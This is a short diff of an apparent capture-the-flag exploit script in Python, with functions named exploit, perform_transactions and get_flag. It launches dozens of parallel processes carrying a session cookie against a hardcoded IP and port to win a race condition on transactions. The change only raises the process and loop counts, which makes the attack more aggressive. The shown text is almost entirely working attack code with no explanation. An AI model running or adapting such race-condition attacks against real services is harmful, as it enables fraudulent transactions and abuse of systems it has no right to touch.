@@ -16,7 +16,7 @@ def perform_transactions(cookie, u):
 	headers = {"Content-Type" : "application/json"}
 	headers['Cookie'] = "session="+cookie
 	start = time.time()
-	for i in range(40):
+	for i in range(50):
 		p1 = multiprocessing.Process(target=exploit, args=(url, data, headers))
 		thread.append(p1)
 	for j in thread:
@@ -48,7 +48,7 @@ def get_flag(s, url):
     return res.cookies
 
 if __name__ == "__main__":
-	for i in range(20):
+	for i in range(40):
 		u = "134.122.104.91:31894"
 		s = get_session(u)
 		perform_transactions(s, u)
